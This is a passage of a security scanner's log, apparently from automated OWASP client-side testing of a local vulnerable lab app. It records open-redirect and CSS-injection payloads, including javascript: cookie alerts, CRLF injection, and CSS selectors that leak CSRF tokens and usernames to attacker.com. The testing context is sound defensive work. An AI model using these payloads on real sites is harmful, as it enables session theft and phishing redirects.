+2025-08-05 14:32:23.382682 |   - Testing redirect payload: view-source:http://evil.com
+2025-08-05 14:32:23.384682 |     [!] HTTP 404 with payload 'view-source:http://evil.com' (URL parameter)
+2025-08-05 14:32:23.384682 |   - Testing redirect payload: http%3A%2F%2Fevil.com
+2025-08-05 14:32:23.386683 |     [!] HTTP 404 with payload 'http%3A%2F%2Fevil.com' (URL parameter)
+2025-08-05 14:32:23.386683 |   - Testing redirect payload: j%61v%61script%3Aalert%281%29
+2025-08-05 14:32:23.388681 |     [!] HTTP 404 with payload 'j%61v%61script%3Aalert%281%29' (URL parameter)
+2025-08-05 14:32:23.388681 |   - Testing hash redirect payload: http://evil.com
+2025-08-05 14:32:23.390119 |     [!] HTTP 404 with payload 'http://evil.com' (URL hash)
+2025-08-05 14:32:23.390119 |   - Testing hash redirect payload: https://attacker.site
+2025-08-05 14:32:23.392419 |     [!] HTTP 404 with payload 'https://attacker.site' (URL hash)
+2025-08-05 14:32:23.392419 |   - Testing hash redirect payload: //evil.com
+2025-08-05 14:32:23.394646 |     [!] HTTP 404 with payload '//evil.com' (URL hash)
+2025-08-05 14:32:23.394646 |   - Testing hash redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.395654 |     [!] HTTP 404 with payload 'javascript:alert(1)' (URL hash)
+2025-08-05 14:32:23.396654 |   - Testing hash redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.397655 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:32:23.397655 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_d/
+2025-08-05 14:32:23.401876 |   - Found potential redirect sink: url=
+2025-08-05 14:32:23.401876 |   - Found potential redirect sink: target=
+2025-08-05 14:32:23.403016 |   - Testing redirect payload: http://evil.com
+2025-08-05 14:32:23.406394 |     [✓] location.href assignment found with payload 'http://evil.com' (URL parameter)
+2025-08-05 14:32:23.406394 |   - Testing redirect payload: https://attacker.site
+2025-08-05 14:32:23.410225 |     [✓] location.href assignment found with payload 'https://attacker.site' (URL parameter)
+2025-08-05 14:32:23.410225 |   - Testing redirect payload: //evil.com
+2025-08-05 14:32:23.413226 |     [✓] location.href assignment found with payload '//evil.com' (URL parameter)
+2025-08-05 14:32:23.413226 |   - Testing redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.417420 |     [✓] location.href assignment found with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:32:23.417420 |   - Testing redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.420928 |     [✓] location.href assignment found with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:32:23.421445 |   - Testing redirect payload: javascript:eval('alert(1)')
+2025-08-05 14:32:23.425155 |     [✓] location.href assignment found with payload 'javascript:eval('alert(1)')' (URL parameter)
+2025-08-05 14:32:23.425155 |   - Testing redirect payload: data:text/html,<script>alert(1)</script>
+2025-08-05 14:32:23.429260 |     [✓] location.href assignment found with payload 'data:text/html,<script>alert(1)</script>' (URL parameter)
+2025-08-05 14:32:23.429260 |   - Testing redirect payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:32:23.432263 |     [✓] location.href assignment found with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:32:23.432263 |   - Testing redirect payload: http://example.com%0d%0aLocation:%20http://evil.com
+2025-08-05 14:32:23.436033 |     [✓] location.href assignment found with payload 'http://example.com%0d%0aLocation:%20http://evil.com' (URL parameter)
+2025-08-05 14:32:23.437065 |   - Testing redirect payload: hTtP://evil.com
+2025-08-05 14:32:23.440077 |     [✓] location.href assignment found with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:32:23.440077 |   - Testing redirect payload: http://evil.com@attacker.site
+2025-08-05 14:32:23.443428 |     [✓] location.href assignment found with payload 'http://evil.com@attacker.site' (URL parameter)
+2025-08-05 14:32:23.444427 |   - Testing redirect payload: http://127.0.0.1:8080.attacker.site
+2025-08-05 14:32:23.446978 |     [✓] location.href assignment found with payload 'http://127.0.0.1:8080.attacker.site' (URL parameter)
+2025-08-05 14:32:23.447984 |   - Testing redirect payload: /../../../../etc/passwd
+2025-08-05 14:32:23.450984 |     [✓] location.href assignment found with payload '/../../../../etc/passwd' (URL parameter)
+2025-08-05 14:32:23.451551 |   - Testing redirect payload: \\evil.com\share
+2025-08-05 14:32:23.454659 |     [✓] location.href assignment found with payload '\\evil.com\share' (URL parameter)
+2025-08-05 14:32:23.454659 |   - Testing redirect payload: chrome://settings
+2025-08-05 14:32:23.458343 |     [✓] location.href assignment found with payload 'chrome://settings' (URL parameter)
+2025-08-05 14:32:23.458343 |   - Testing redirect payload: about:blank
+2025-08-05 14:32:23.461476 |     [✓] location.href assignment found with payload 'about:blank' (URL parameter)
+2025-08-05 14:32:23.462482 |   - Testing redirect payload: view-source:http://evil.com
+2025-08-05 14:32:23.465995 |     [✓] location.href assignment found with payload 'view-source:http://evil.com' (URL parameter)
+2025-08-05 14:32:23.465995 |   - Testing redirect payload: http%3A%2F%2Fevil.com
+2025-08-05 14:32:23.469692 |     [✓] location.href assignment found with payload 'http%3A%2F%2Fevil.com' (URL parameter)
+2025-08-05 14:32:23.469692 |   - Testing redirect payload: j%61v%61script%3Aalert%281%29
+2025-08-05 14:32:23.473333 |     [✓] location.href assignment found with payload 'j%61v%61script%3Aalert%281%29' (URL parameter)
+2025-08-05 14:32:23.473333 |   - Testing hash redirect payload: http://evil.com
+2025-08-05 14:32:23.476776 |     [✓] location.href assignment found with payload 'http://evil.com' (URL hash)
+2025-08-05 14:32:23.476776 |   - Testing hash redirect payload: https://attacker.site
+2025-08-05 14:32:23.480434 |     [✓] location.href assignment found with payload 'https://attacker.site' (URL hash)
+2025-08-05 14:32:23.480434 |   - Testing hash redirect payload: //evil.com
+2025-08-05 14:32:23.484390 |     [✓] location.href assignment found with payload '//evil.com' (URL hash)
+2025-08-05 14:32:23.484390 |   - Testing hash redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.487399 |     [✓] location.href assignment found with payload 'javascript:alert(1)' (URL hash)
+2025-08-05 14:32:23.487399 |   - Testing hash redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.491687 |     [✓] location.href assignment found with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:32:23.491687 | 
+[i] Testing page: http://localhost:8080/login.php
+2025-08-05 14:32:23.495109 |   - Found potential redirect sink: target=
+2025-08-05 14:32:23.495109 |   - Testing redirect payload: http://evil.com
+2025-08-05 14:32:23.498494 |     [-] No obvious redirect vulnerability with payload 'http://evil.com' (URL parameter)
+2025-08-05 14:32:23.498494 |   - Testing redirect payload: https://attacker.site
+2025-08-05 14:32:23.501900 |     [-] No obvious redirect vulnerability with payload 'https://attacker.site' (URL parameter)
+2025-08-05 14:32:23.502961 |   - Testing redirect payload: //evil.com
+2025-08-05 14:32:23.505961 |     [-] No obvious redirect vulnerability with payload '//evil.com' (URL parameter)
+2025-08-05 14:32:23.506960 |   - Testing redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.509409 |     [-] No obvious redirect vulnerability with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:32:23.509409 |   - Testing redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.514168 |     [-] No obvious redirect vulnerability with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:32:23.514168 |   - Testing redirect payload: javascript:eval('alert(1)')
+2025-08-05 14:32:23.517574 |     [-] No obvious redirect vulnerability with payload 'javascript:eval('alert(1)')' (URL parameter)
+2025-08-05 14:32:23.518578 |   - Testing redirect payload: data:text/html,<script>alert(1)</script>
+2025-08-05 14:32:23.521888 |     [-] No obvious redirect vulnerability with payload 'data:text/html,<script>alert(1)</script>' (URL parameter)
+2025-08-05 14:32:23.521888 |   - Testing redirect payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:32:23.524932 |     [-] No obvious redirect vulnerability with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:32:23.524932 |   - Testing redirect payload: http://example.com%0d%0aLocation:%20http://evil.com
+2025-08-05 14:32:23.528513 |     [-] No obvious redirect vulnerability with payload 'http://example.com%0d%0aLocation:%20http://evil.com' (URL parameter)
+2025-08-05 14:32:23.528513 |   - Testing redirect payload: hTtP://evil.com
+2025-08-05 14:32:23.532799 |     [-] No obvious redirect vulnerability with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:32:23.532799 |   - Testing redirect payload: http://evil.com@attacker.site
+2025-08-05 14:32:23.535520 |     [-] No obvious redirect vulnerability with payload 'http://evil.com@attacker.site' (URL parameter)
+2025-08-05 14:32:23.535520 |   - Testing redirect payload: http://127.0.0.1:8080.attacker.site
+2025-08-05 14:32:23.538530 |     [-] No obvious redirect vulnerability with payload 'http://127.0.0.1:8080.attacker.site' (URL parameter)
+2025-08-05 14:32:23.538530 |   - Testing redirect payload: /../../../../etc/passwd
+2025-08-05 14:32:23.541904 |     [-] No obvious redirect vulnerability with payload '/../../../../etc/passwd' (URL parameter)
+2025-08-05 14:32:23.541904 |   - Testing redirect payload: \\evil.com\share
+2025-08-05 14:32:23.545683 |     [-] No obvious redirect vulnerability with payload '\\evil.com\share' (URL parameter)
+2025-08-05 14:32:23.545683 |   - Testing redirect payload: chrome://settings
+2025-08-05 14:32:23.548901 |     [-] No obvious redirect vulnerability with payload 'chrome://settings' (URL parameter)
+2025-08-05 14:32:23.548901 |   - Testing redirect payload: about:blank
+2025-08-05 14:32:23.552490 |     [-] No obvious redirect vulnerability with payload 'about:blank' (URL parameter)
+2025-08-05 14:32:23.553489 |   - Testing redirect payload: view-source:http://evil.com
+2025-08-05 14:32:23.556597 |     [-] No obvious redirect vulnerability with payload 'view-source:http://evil.com' (URL parameter)
+2025-08-05 14:32:23.556597 |   - Testing redirect payload: http%3A%2F%2Fevil.com
+2025-08-05 14:32:23.560683 |     [-] No obvious redirect vulnerability with payload 'http%3A%2F%2Fevil.com' (URL parameter)
+2025-08-05 14:32:23.561917 |   - Testing redirect payload: j%61v%61script%3Aalert%281%29
+2025-08-05 14:32:23.565453 |     [-] No obvious redirect vulnerability with payload 'j%61v%61script%3Aalert%281%29' (URL parameter)
+2025-08-05 14:32:23.565453 |   - Testing hash redirect payload: http://evil.com
+2025-08-05 14:32:23.571718 |     [-] No obvious redirect vulnerability with payload 'http://evil.com' (URL hash)
+2025-08-05 14:32:23.571718 |   - Testing hash redirect payload: https://attacker.site
+2025-08-05 14:32:23.575954 |     [-] No obvious redirect vulnerability with payload 'https://attacker.site' (URL hash)
+2025-08-05 14:32:23.575954 |   - Testing hash redirect payload: //evil.com
+2025-08-05 14:32:23.579620 |     [-] No obvious redirect vulnerability with payload '//evil.com' (URL hash)
+2025-08-05 14:32:23.580143 |   - Testing hash redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.583390 |     [-] No obvious redirect vulnerability with payload 'javascript:alert(1)' (URL hash)
+2025-08-05 14:32:23.583390 |   - Testing hash redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.586522 |     [-] No obvious redirect vulnerability with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:32:23.586522 | 
+[i] Testing page: http://localhost:8080/logout.php
+2025-08-05 14:32:23.592097 |   - Found potential redirect sink: target=
+2025-08-05 14:32:23.593097 |   - Testing redirect payload: http://evil.com
+2025-08-05 14:32:23.595102 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.595102 |   - Testing redirect payload: https://attacker.site
+2025-08-05 14:32:23.597356 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.598356 |   - Testing redirect payload: //evil.com
+2025-08-05 14:32:23.600357 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.600357 |   - Testing redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.602359 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.602359 |   - Testing redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.604356 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.605495 |   - Testing redirect payload: javascript:eval('alert(1)')
+2025-08-05 14:32:23.606495 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.608000 |   - Testing redirect payload: data:text/html,<script>alert(1)</script>
+2025-08-05 14:32:23.610006 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.610006 |   - Testing redirect payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:32:23.612006 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.613005 |   - Testing redirect payload: http://example.com%0d%0aLocation:%20http://evil.com
+2025-08-05 14:32:23.615010 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.615010 |   - Testing redirect payload: hTtP://evil.com
+2025-08-05 14:32:23.617144 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.617144 |   - Testing redirect payload: http://evil.com@attacker.site
+2025-08-05 14:32:23.619144 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.620143 |   - Testing redirect payload: http://127.0.0.1:8080.attacker.site
+2025-08-05 14:32:23.622146 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.622146 |   - Testing redirect payload: /../../../../etc/passwd
+2025-08-05 14:32:23.625143 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.625143 |   - Testing redirect payload: \\evil.com\share
+2025-08-05 14:32:23.627361 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.627361 |   - Testing redirect payload: chrome://settings
+2025-08-05 14:32:23.629371 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.629371 |   - Testing redirect payload: about:blank
+2025-08-05 14:32:23.632368 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.632368 |   - Testing redirect payload: view-source:http://evil.com
+2025-08-05 14:32:23.634368 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.634368 |   - Testing redirect payload: http%3A%2F%2Fevil.com
+2025-08-05 14:32:23.636759 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.636759 |   - Testing redirect payload: j%61v%61script%3Aalert%281%29
+2025-08-05 14:32:23.638772 |     [!] Redirect detected but payload not in Location header (Status: 302)
+2025-08-05 14:32:23.639770 |   - Testing hash redirect payload: http://evil.com
+2025-08-05 14:32:23.643983 |     [-] No obvious redirect vulnerability with payload 'http://evil.com' (URL hash)
+2025-08-05 14:32:23.643983 |   - Testing hash redirect payload: https://attacker.site
+2025-08-05 14:32:23.648477 |     [-] No obvious redirect vulnerability with payload 'https://attacker.site' (URL hash)
+2025-08-05 14:32:23.649924 |   - Testing hash redirect payload: //evil.com
+2025-08-05 14:32:23.653849 |     [-] No obvious redirect vulnerability with payload '//evil.com' (URL hash)
+2025-08-05 14:32:23.653849 |   - Testing hash redirect payload: javascript:alert(1)
+2025-08-05 14:32:23.659755 |     [-] No obvious redirect vulnerability with payload 'javascript:alert(1)' (URL hash)
+2025-08-05 14:32:23.659755 |   - Testing hash redirect payload: javascript:alert(document.cookie)
+2025-08-05 14:32:23.664767 |     [-] No obvious redirect vulnerability with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:32:23.665767 | ----- OTG-CLIENT-004 Test Completed -----
+
+2025-08-05 14:40:53.774115 | [+] Login successful (Status: 200)
+2025-08-05 14:40:53.828600 | [+] Security level set to low
+2025-08-05 14:40:53.828600 | ----- Starting OTG-CLIENT-005 (CSS Injection) -----
+2025-08-05 14:40:53.828600 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 14:40:53.833189 |   - No obvious CSS sinks found in page source
+2025-08-05 14:40:53.833189 |   - Testing payload: red; background-color: blue
+2025-08-05 14:40:53.836349 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL parameter)
+2025-08-05 14:40:53.836349 |   - Testing payload: red; font-size: 100px
+2025-08-05 14:40:53.840436 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL parameter)
+2025-08-05 14:40:53.840436 |   - Testing payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:53.843435 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL parameter)
+2025-08-05 14:40:53.843435 |   - Testing payload: red; -o-link-source: current
+2025-08-05 14:40:53.847069 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL parameter)
+2025-08-05 14:40:53.847622 |   - Testing payload: expression(alert(1))
+2025-08-05 14:40:53.850865 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL parameter)
+2025-08-05 14:40:53.850865 |   - Testing payload: red; -moz-binding: url('http://attacker.com/xss.xml')
+2025-08-05 14:40:53.855542 |     [-] No obvious CSS injection with payload 'red; -moz-binding: url('http://attacker.com/xss.xml')' (URL parameter)
+2025-08-05 14:40:53.855542 |   - Testing payload: red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:53.859880 |     [-] No obvious CSS injection with payload 'red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:53.859880 |   - Testing payload: red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:53.863659 |     [-] No obvious CSS injection with payload 'red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:53.863659 |   - Testing payload: red; @import url('http://attacker.com/malicious.css')
+2025-08-05 14:40:53.868739 |     [-] No obvious CSS injection with payload 'red; @import url('http://attacker.com/malicious.css')' (URL parameter)
+2025-08-05 14:40:53.868739 |   - Testing payload: red; @font-face { font-family: x; src: url('http://attacker.com/steal') }
+2025-08-05 14:40:53.873391 |     [-] No obvious CSS injection with payload 'red; @font-face { font-family: x; src: url('http://attacker.com/steal') }' (URL parameter)
+2025-08-05 14:40:53.873897 |   - Testing payload: red; behavior: url(xss.htc)
+2025-08-05 14:40:53.876964 |     [-] No obvious CSS injection with payload 'red; behavior: url(xss.htc)' (URL parameter)
+2025-08-05 14:40:53.878146 |   - Testing payload: red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }
+2025-08-05 14:40:53.881434 |     [-] No obvious CSS injection with payload 'red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }' (URL parameter)
+2025-08-05 14:40:53.881434 |   - Testing payload: red; @media screen { div { background-image: url('http://attacker.com/?screen') } }
+2025-08-05 14:40:53.885433 |     [-] No obvious CSS injection with payload 'red; @media screen { div { background-image: url('http://attacker.com/?screen') } }' (URL parameter)
+2025-08-05 14:40:53.885433 |   - Testing payload: red; @namespace x 'http://attacker.com/malicious'
+2025-08-05 14:40:53.889900 |     [-] No obvious CSS injection with payload 'red; @namespace x 'http://attacker.com/malicious'' (URL parameter)
+2025-08-05 14:40:53.890920 |   - Testing payload: r\65 d; background-color: blue
+2025-08-05 14:40:53.893922 |     [-] No obvious CSS injection with payload 'r\65 d; background-color: blue' (URL parameter)
+2025-08-05 14:40:53.893922 |   - Testing payload: red\3b \62 ackground-color\3a blue
+2025-08-05 14:40:53.897829 |     [-] No obvious CSS injection with payload 'red\3b \62 ackground-color\3a blue' (URL parameter)
+2025-08-05 14:40:53.898845 |   - Testing payload: \72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65
+2025-08-05 14:40:53.902178 |     [-] No obvious CSS injection with payload '\72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65' (URL parameter)
+2025-08-05 14:40:53.902178 |   - Testing hash CSS payload: red; background-color: blue
+2025-08-05 14:40:53.905207 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL hash)
+2025-08-05 14:40:53.905207 |   - Testing hash CSS payload: red; font-size: 100px
+2025-08-05 14:40:53.908281 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL hash)
+2025-08-05 14:40:53.909279 |   - Testing hash CSS payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:53.912498 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL hash)
+2025-08-05 14:40:53.912498 |   - Testing hash CSS payload: red; -o-link-source: current
+2025-08-05 14:40:53.915497 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL hash)
+2025-08-05 14:40:53.915497 |   - Testing hash CSS payload: expression(alert(1))
+2025-08-05 14:40:53.919497 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL hash)
+2025-08-05 14:40:53.919497 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_d/
+2025-08-05 14:40:53.922650 |   - No obvious CSS sinks found in page source
+2025-08-05 14:40:53.922650 |   - Testing payload: red; background-color: blue
+2025-08-05 14:40:53.925833 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL parameter)
+2025-08-05 14:40:53.925833 |   - Testing payload: red; font-size: 100px
+2025-08-05 14:40:53.928909 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL parameter)
+2025-08-05 14:40:53.929919 |   - Testing payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:53.932353 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL parameter)
+2025-08-05 14:40:53.932353 |   - Testing payload: red; -o-link-source: current
+2025-08-05 14:40:53.936352 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL parameter)
+2025-08-05 14:40:53.936352 |   - Testing payload: expression(alert(1))
+2025-08-05 14:40:53.939352 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL parameter)
+2025-08-05 14:40:53.939352 |   - Testing payload: red; -moz-binding: url('http://attacker.com/xss.xml')
+2025-08-05 14:40:53.942693 |     [-] No obvious CSS injection with payload 'red; -moz-binding: url('http://attacker.com/xss.xml')' (URL parameter)
+2025-08-05 14:40:53.943692 |   - Testing payload: red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:53.946692 |     [-] No obvious CSS injection with payload 'red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:53.947197 |   - Testing payload: red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:53.950202 |     [-] No obvious CSS injection with payload 'red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:53.950202 |   - Testing payload: red; @import url('http://attacker.com/malicious.css')
+2025-08-05 14:40:53.953360 |     [-] No obvious CSS injection with payload 'red; @import url('http://attacker.com/malicious.css')' (URL parameter)
+2025-08-05 14:40:53.953360 |   - Testing payload: red; @font-face { font-family: x; src: url('http://attacker.com/steal') }
+2025-08-05 14:40:53.956370 |     [-] No obvious CSS injection with payload 'red; @font-face { font-family: x; src: url('http://attacker.com/steal') }' (URL parameter)
+2025-08-05 14:40:53.957443 |   - Testing payload: red; behavior: url(xss.htc)
+2025-08-05 14:40:53.960452 |     [-] No obvious CSS injection with payload 'red; behavior: url(xss.htc)' (URL parameter)
+2025-08-05 14:40:53.960452 |   - Testing payload: red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }
+2025-08-05 14:40:53.963594 |     [-] No obvious CSS injection with payload 'red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }' (URL parameter)
+2025-08-05 14:40:53.963594 |   - Testing payload: red; @media screen { div { background-image: url('http://attacker.com/?screen') } }
+2025-08-05 14:40:53.966602 |     [-] No obvious CSS injection with payload 'red; @media screen { div { background-image: url('http://attacker.com/?screen') } }' (URL parameter)
+2025-08-05 14:40:53.967602 |   - Testing payload: red; @namespace x 'http://attacker.com/malicious'
+2025-08-05 14:40:53.970602 |     [-] No obvious CSS injection with payload 'red; @namespace x 'http://attacker.com/malicious'' (URL parameter)
+2025-08-05 14:40:53.970602 |   - Testing payload: r\65 d; background-color: blue
+2025-08-05 14:40:53.974074 |     [-] No obvious CSS injection with payload 'r\65 d; background-color: blue' (URL parameter)
+2025-08-05 14:40:53.974074 |   - Testing payload: red\3b \62 ackground-color\3a blue
+2025-08-05 14:40:53.977075 |     [-] No obvious CSS injection with payload 'red\3b \62 ackground-color\3a blue' (URL parameter)
+2025-08-05 14:40:53.978074 |   - Testing payload: \72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65
+2025-08-05 14:40:53.981074 |     [-] No obvious CSS injection with payload '\72\65\64\3b\62\61\63\6b\67\72\6f\75\6e\64\2d\63\6f\6c\6f\72\3a\62\6c\75\65' (URL parameter)
+2025-08-05 14:40:53.981074 |   - Testing hash CSS payload: red; background-color: blue
+2025-08-05 14:40:53.984257 |     [-] No obvious CSS injection with payload 'red; background-color: blue' (URL hash)
+2025-08-05 14:40:53.984257 |   - Testing hash CSS payload: red; font-size: 100px
+2025-08-05 14:40:53.987572 |     [-] No obvious CSS injection with payload 'red; font-size: 100px' (URL hash)
+2025-08-05 14:40:53.988576 |   - Testing hash CSS payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:53.990988 |     [-] No obvious CSS injection with payload 'red; -o-link:'javascript:alert(1)'' (URL hash)
+2025-08-05 14:40:53.991998 |   - Testing hash CSS payload: red; -o-link-source: current
+2025-08-05 14:40:53.995053 |     [-] No obvious CSS injection with payload 'red; -o-link-source: current' (URL hash)
+2025-08-05 14:40:53.995053 |   - Testing hash CSS payload: expression(alert(1))
+2025-08-05 14:40:53.998245 |     [-] No obvious CSS injection with payload 'expression(alert(1))' (URL hash)
+2025-08-05 14:40:53.998245 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client/
+2025-08-05 14:40:54.000443 |   - No obvious CSS sinks found in page source
+2025-08-05 14:40:54.000443 |   - Testing payload: red; background-color: blue
+2025-08-05 14:40:54.002531 |     [!] HTTP 404 with payload 'red; background-color: blue' (URL parameter)
+2025-08-05 14:40:54.002531 |   - Testing payload: red; font-size: 100px
+2025-08-05 14:40:54.004735 |     [!] HTTP 404 with payload 'red; font-size: 100px' (URL parameter)
+2025-08-05 14:40:54.004735 |   - Testing payload: red; -o-link:'javascript:alert(1)'
+2025-08-05 14:40:54.006865 |     [!] HTTP 404 with payload 'red; -o-link:'javascript:alert(1)'' (URL parameter)
+2025-08-05 14:40:54.006865 |   - Testing payload: red; -o-link-source: current
+2025-08-05 14:40:54.008865 |     [!] HTTP 404 with payload 'red; -o-link-source: current' (URL parameter)
+2025-08-05 14:40:54.008865 |   - Testing payload: expression(alert(1))
+2025-08-05 14:40:54.010333 |     [!] HTTP 404 with payload 'expression(alert(1))' (URL parameter)
+2025-08-05 14:40:54.010333 |   - Testing payload: red; -moz-binding: url('http://attacker.com/xss.xml')
+2025-08-05 14:40:54.012615 |     [!] HTTP 404 with payload 'red; -moz-binding: url('http://attacker.com/xss.xml')' (URL parameter)
+2025-08-05 14:40:54.012615 |   - Testing payload: red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:54.014614 |     [!] HTTP 404 with payload 'red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:54.014614 |   - Testing payload: red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }
+2025-08-05 14:40:54.016755 |     [!] HTTP 404 with payload 'red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }' (URL parameter)
+2025-08-05 14:40:54.016755 |   - Testing payload: red; @import url('http://attacker.com/malicious.css')
+2025-08-05 14:40:54.018760 |     [!] HTTP 404 with payload 'red; @import url('http://attacker.com/malicious.css')' (URL parameter)
+2025-08-05 14:40:54.018760 |   - Testing payload: red; @font-face { font-family: x; src: url('http://attacker.com/steal') }
+2025-08-05 14:40:54.020758 |     [!] HTTP 404 with payload 'red; @font-face { font-family: x; src: url('http://attacker.com/steal') }' (URL parameter)
+2025-08-05 14:40:54.020758 |   - Testing payload: red; behavior: url(xss.htc)
+2025-08-05 14:40:54.021758 |     [!] HTTP 404 with payload 'red; behavior: url(xss.htc)' (URL parameter)
+2025-08-05 14:40:54.021758 |   - Testing payload: red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }
+2025-08-05 14:40:54.024126 |     [!] HTTP 404 with payload 'red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }' (URL parameter)
+2025-08-05 14:40:54.024126 |   - Testing payload: red; @media screen { div { background-image: url('http://attacker.com/?screen') } }
+2025-08-05 14:40:54.025126 |     [!] HTTP 404 with payload 'red; @media screen { div { background-image: url('http://attacker.com/?screen') } }' (URL parameter)
+2025-08-05 14:40:54.025126 |   - Testing payload: red; @namespace x 'http://attacker.com/malicious'
+2025-08-05 14:40:54.027760 |     [!] HTTP 404 with payload 'red; @namespace x 'http://attacker.com/malicious'' (URL parameter)
+2025-08-05 14:40:54.027760 |   - Testing payload: r\65 d; background-color: blue
+2025-08-05 14:40:54.029264 |     [!] HTTP 404 with payload 'r\65 d; background-color: blue' (URL parameter)
